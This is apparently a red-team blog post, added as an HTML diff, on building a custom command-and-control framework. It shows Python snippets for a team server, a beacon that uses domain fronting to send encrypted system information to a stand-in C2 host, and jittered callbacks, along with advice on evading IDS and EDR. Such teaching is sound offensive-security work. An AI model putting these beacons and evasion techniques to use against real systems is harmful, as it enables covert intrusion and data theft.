@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Building a Custom C2 Framework - A deep dive into designing modular command and control infrastructure">
+    <meta name="author" content="Philipp (fr3akazo1d)">
+    <title>Building a Custom C2 Framework | fr3akazo1d</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/blog.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Custom Cursor -->
+    <div class="cursor"></div>
+    <div class="cursor-follower"></div>
+
+    <!-- Navigation -->
+    <nav class="nav-menu">
+        <ul>
+            <li><a href="../index.html" class="nav-link">← Back to Home</a></li>
+            <li><a href="../index.html#blog" class="nav-link">Blog</a></li>
+            <li><a href="../index.html#contact" class="nav-link">Contact</a></li>
+        </ul>
+    </nav>
+
+    <!-- Blog Post -->
+    <article class="blog-post">
+        <!-- Post Header -->
+        <header class="post-header">
+            <h1 class="post-title glitch" data-text="Building a Custom C2 Framework">Building a Custom C2 Framework</h1>
+            <div class="post-meta">
+                <span class="post-date">[2025-10-28]</span>
+                <span class="post-tag">#adversary-emulation</span>
+                <span class="post-reading-time">15 min read</span>
+            </div>
+            <div class="post-author">
+                <span>by <strong>fr3akazo1d</strong></span>
+            </div>
+        </header>
+
+        <!-- Post Content -->
+        <div class="post-content">
+            <p>
+                In the world of red teaming and adversary emulation, having a robust Command and Control (C2) 
+                framework is crucial. While there are excellent open-source options like Cobalt Strike, Metasploit, 
+                and Empire, building your own C2 framework can provide unique advantages in terms of customization, 
+                evasion, and operational security.
+            </p>
+
+            <p>
+                In this post, I'll walk you through the fundamental concepts of designing a custom C2 framework, 
+                focusing on architecture, communication protocols, and evasion techniques.
+            </p>
+
+            <h2>Why Build a Custom C2?</h2>
+
+            <p>
+                Before diving into the technical details, let's discuss <em>why</em> you might want to build 
+                your own C2 framework:
+            </p>
+
+            <ul>
+                <li><strong>Evasion:</strong> Custom frameworks are less likely to be detected by signature-based detection systems</li>
+                <li><strong>Flexibility:</strong> Complete control over features, protocols, and implementation</li>
+                <li><strong>Learning:</strong> Deep understanding of offensive security concepts and network protocols</li>
+                <li><strong>Operational Security:</strong> No reliance on publicly known frameworks that defenders are familiar with</li>
+                <li><strong>Customization:</strong> Tailored features for specific engagement requirements</li>
+            </ul>
+
+            <h2>Core Components of a C2 Framework</h2>
+
+            <p>
+                A typical C2 framework consists of several key components:
+            </p>
+
+            <h3>1. Command Server (Team Server)</h3>
+
+            <p>
+                The command server is the brain of your C2 infrastructure. It handles:
+            </p>
+
+            <ul>
+                <li>Operator authentication and session management</li>
+                <li>Agent registration and tracking</li>
+                <li>Task queuing and result processing</li>
+                <li>Logging and reporting</li>
+            </ul>
+
+            <div class="terminal-code">
+                <div class="terminal-code-header">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                    <span style="margin-left: auto; color: #c0c0c0; font-size: 0.9rem;">server.py</span>
+                </div>
+                <div class="terminal-code-body">
+                    <pre><code class="language-python">class C2Server:
+    def __init__(self, host='0.0.0.0', port=443):
+        self.host = host
+        self.port = port
+        self.agents = {}
+        self.task_queue = {}
+        
+    def start(self):
+        """Initialize the C2 server"""
+        self.setup_ssl()
+        self.start_listener()
+        self.operator_interface()
+    
+    def register_agent(self, agent_id, metadata):
+        """Register a new agent callback"""
+        self.agents[agent_id] = {
+            'metadata': metadata,
+            'last_seen': time.time(),
+            'status': 'active'
+        }
+        print(f"[+] New agent registered: {agent_id}")
+    
+    def queue_task(self, agent_id, command):
+        """Queue a task for an agent"""
+        if agent_id not in self.task_queue:
+            self.task_queue[agent_id] = []
+        self.task_queue[agent_id].append(command)</code></pre>
+                </div>
+            </div>
+
+            <h3>2. Agent (Implant/Beacon)</h3>
+
+            <p>
+                The agent is the payload that runs on the compromised system. It should be:
+            </p>
+
+            <ul>
+                <li>Lightweight and memory-efficient</li>
+                <li>Resilient to network interruptions</li>
+                <li>Capable of executing various post-exploitation tasks</li>
+                <li>Difficult to detect and analyze</li>
+            </ul>
+
+            <h3>3. Communication Protocol</h3>
+
+            <p>
+                The communication protocol defines how the agent and server exchange information. 
+                Modern C2 frameworks often use:
+            </p>
+
+            <ul>
+                <li><strong>HTTPS:</strong> Encrypted, blends with normal web traffic</li>
+                <li><strong>DNS:</strong> Covert channel, works in restrictive networks</li>
+                <li><strong>WebSockets:</strong> Real-time bidirectional communication</li>
+                <li><strong>Custom protocols:</strong> Domain-specific, harder to fingerprint</li>
+            </ul>
+
+            <h2>Evasion Techniques</h2>
+
+            <blockquote>
+                <p>
+                    "The best C2 framework is the one that defenders never see."
+                </p>
+            </blockquote>
+
+            <p>
+                Implementing effective evasion techniques is critical for operational success:
+            </p>
+
+            <h3>Domain Fronting</h3>
+
+            <p>
+                Domain fronting allows you to hide your true destination by using a high-reputation domain 
+                as a front. The technique leverages CDN routing to reach your actual C2 server.
+            </p>
+
+            <div class="terminal-code">
+                <div class="terminal-code-header">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                    <span style="margin-left: auto; color: #c0c0c0; font-size: 0.9rem;">agent.py</span>
+                </div>
+                <div class="terminal-code-body">
+                    <pre><code class="language-python">def beacon_callback(self):
+    """Perform callback using domain fronting"""
+    headers = {
+        'Host': 'actual-c2-server.com',  # Real destination
+        'User-Agent': self.generate_ua(),
+        'X-Request-ID': self.generate_request_id()
+    }
+    
+    # Use high-reputation CDN domain
+    response = requests.post(
+        'https://cloudfront.amazonaws.com/api/v1/beacon',
+        headers=headers,
+        data=self.encrypt_data(self.get_system_info()),
+        verify=True
+    )
+    
+    return self.decrypt_data(response.content)</code></pre>
+                </div>
+            </div>
+
+            <h3>Jitter and Sleep</h3>
+
+            <p>
+                Implementing randomized callback intervals (jitter) helps avoid detection by behavioral analysis systems:
+            </p>
+
+            <div class="terminal-code">
+                <div class="terminal-code-header">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                </div>
+                <div class="terminal-code-body">
+                    <pre><code class="language-python">import random
+import time
+
+def calculate_sleep(base_interval=60, jitter=0.3):
+    """Calculate sleep time with jitter"""
+    jitter_amount = base_interval * jitter
+    sleep_time = base_interval + random.uniform(-jitter_amount, jitter_amount)
+    return max(sleep_time, 5)  # Minimum 5 seconds
+
+# Usage in beacon loop
+while True:
+    try:
+        tasks = self.check_in()
+        self.execute_tasks(tasks)
+    except Exception as e:
+        self.log_error(e)
+    
+    time.sleep(calculate_sleep(base_interval=300, jitter=0.4))</code></pre>
+                </div>
+            </div>
+
+            <h2>Encryption and Authentication</h2>
+
+            <p>
+                All C2 traffic should be encrypted to prevent network monitoring and man-in-the-middle attacks. 
+                I recommend using:
+            </p>
+
+            <ul>
+                <li><strong>AES-256-GCM</strong> for data encryption</li>
+                <li><strong>RSA-2048</strong> or <strong>ECDH</strong> for key exchange</li>
+                <li><strong>HMAC-SHA256</strong> for message authentication</li>
+            </ul>
+
+            <h2>Operational Security Considerations</h2>
+
+            <p>
+                When deploying a C2 framework in real engagements, consider these OpSec practices:
+            </p>
+
+            <h3>Infrastructure Compartmentalization</h3>
+
+            <ul>
+                <li>Use redirectors to separate your C2 server from direct internet exposure</li>
+                <li>Implement multiple layers of infrastructure (redirector → proxy → C2)</li>
+                <li>Use different IP addresses for different stages of the engagement</li>
+                <li>Leverage cloud providers with automatic IP rotation</li>
+            </ul>
+
+            <h3>Traffic Obfuscation</h3>
+
+            <p>
+                Make your C2 traffic blend in with legitimate network activity:
+            </p>
+
+            <ul>
+                <li>Mimic legitimate applications (e.g., Microsoft Office update traffic)</li>
+                <li>Use standard ports (80, 443, 53) and protocols</li>
+                <li>Implement realistic HTTP headers and user agents</li>
+                <li>Add benign-looking URI paths and parameters</li>
+            </ul>
+
+            <h2>Testing Your C2 Framework</h2>
+
+            <p>
+                Before deploying your custom C2 in a real engagement, thorough testing is essential:
+            </p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Test Type</th>
+                        <th>Purpose</th>
+                        <th>Tools</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Network Detection</td>
+                        <td>Test against IDS/IPS</td>
+                        <td>Snort, Suricata, Zeek</td>
+                    </tr>
+                    <tr>
+                        <td>Endpoint Detection</td>
+                        <td>Test against EDR/AV</td>
+                        <td>Windows Defender, CrowdStrike, Carbon Black</td>
+                    </tr>
+                    <tr>
+                        <td>Traffic Analysis</td>
+                        <td>Verify encryption and obfuscation</td>
+                        <td>Wireshark, tcpdump</td>
+                    </tr>
+                    <tr>
+                        <td>Stability</td>
+                        <td>Long-term operation testing</td>
+                        <td>Custom scripts, monitoring</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2>Conclusion</h2>
+
+            <p>
+                Building a custom C2 framework is a challenging but rewarding endeavor. It provides deep insights 
+                into offensive security operations and gives you complete control over your tooling.
+            </p>
+
+            <p>
+                Remember that the goal isn't to reinvent the wheel entirely—learn from existing frameworks, 
+                understand their strengths and weaknesses, and build something that meets your specific needs.
+            </p>
+
+            <p>
+                In future posts, I'll dive deeper into specific components like agent architecture, 
+                post-exploitation modules, and advanced evasion techniques.
+            </p>
+
+            <p>
+                <strong>Stay stealthy, stay curious.</strong>
+            </p>
+        </div>
+
+        <!-- Post Footer -->
+        <footer class="post-footer">
+            <div class="post-tags">
+                <a href="#" class="tag">#red-team</a>
+                <a href="#" class="tag">#c2-framework</a>
+                <a href="#" class="tag">#adversary-emulation</a>
+                <a href="#" class="tag">#evasion</a>
+                <a href="#" class="tag">#python</a>
+            </div>
+
+            <div class="post-share">
+                <h3>Share this post</h3>
+                <div class="share-buttons">
+                    <a href="#" class="share-btn">Twitter</a>
+                    <a href="#" class="share-btn">LinkedIn</a>
+                    <a href="#" class="share-btn">Reddit</a>
+                </div>
+            </div>
+
+            <a href="../index.html#blog" class="back-to-blog">← Back to all posts</a>
+        </footer>
+    </article>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
